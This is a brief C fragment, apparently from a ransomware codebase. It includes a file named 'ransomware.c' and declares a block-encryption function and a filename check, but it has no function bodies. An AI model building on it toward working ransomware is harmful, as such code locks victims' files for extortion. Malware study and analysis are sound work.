#include "ransomware.c"

void encrypt_block(uint8_t *, uint8_t, int,
                   const uint8_t *, size_t);

int is_filename_proper(const char *);
